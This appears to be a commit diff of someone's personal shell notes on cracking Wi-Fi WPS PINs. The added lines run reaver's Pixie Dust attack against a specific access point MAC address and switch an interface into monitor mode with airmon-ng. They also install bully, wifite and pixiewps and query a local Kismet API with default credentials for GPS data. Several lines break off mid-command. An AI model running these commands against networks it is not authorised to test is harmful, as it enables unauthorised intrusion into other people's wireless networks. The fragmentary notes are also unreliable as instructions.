f6d541967c86cf3b0592cee805669c042f295ccd
Robert <robby2992@gmail.com>
2024-01-18 10:46:22 -0500

    ed3d3

--- CANO/12. Pixie Reaver.sh
+++ CANO/12. Pixie Reaver.sh
@@ -3,3 +3,10 @@ exploits a math problem in WPS
 # bully
 bully does the fake auth, then when password is shared with you it prints it to the terminal
 sudo reaver -i wlx00c0cab46234 -b 74:DA:88:59:96:A9 -c 10 -K -S -vvv | tee output.txt
+sudo reaver -i wlan0mon -b 74:DA:88:59:96:A9 -c 5 -K -S -vvv
+
+#switchin your wlan to monitor mode
+sudo ifconfig wlx00c0cab40201 down # down the interface
+sudo airmon
+sudo airmon-ng start wlx00c0cab46234
+sudo wash -i 
--- CANO/8. xx.tools.sh
+++ CANO/8. xx.tools.sh
@@ -1,3 +1,9 @@
+install tools
+sudo apt install wireguard
+sudo apt install git
+sudo apt install scrapy
+sudo apt install bully
+sudo apt install wifite
 #scrappy
 pip install Scrapy
 sudo apt install python3-Scrapy
@@ -7,6 +13,13 @@ scrapy startproject wordlist_scrappe
 sudo apt install aircrack-ng
 #hashcat
 get lists from country agency
+#kismet API calling
+GET http://kismet:kismet@0.0.0.0:2501/gps/all_gps.prettyjson
+  "description.kismet.gps.uuid": "uuid, UUID",
+  "kismet.gps.uuid": "17180436-0000-0000-0000-0000F5D11357",
+/gps/by-uuid/17180436-0000-0000-0000-0000F5D11357/location.prettyjson
+GET http://kismet:kismet@0.0.0.0:2501/gps/by-uuid/17180436-0000-0000-0000-0000F5D11357/location.prettyjson
+GET http://kismet:kismet@0.0.0.0:2501/g
 
 ## rsync
 rsync --daemon
@@ -15,3 +28,7 @@ ps x | grep rsync
 sudo reaver -i wlx00c0cab46234 -b 74:DA:88:59:96:A9 -c 10 -K -S -vvv | tee output.txt
 #wifite
 sudo apt install wifite
+#cloning  a repo
+git clone https://github.com/t6x/reaver-wps-fork-t6x.git
+CTRL + SHIFT + V
+sudo apt -y install build-essential libpcap-dev aircrack-ng pixiewps
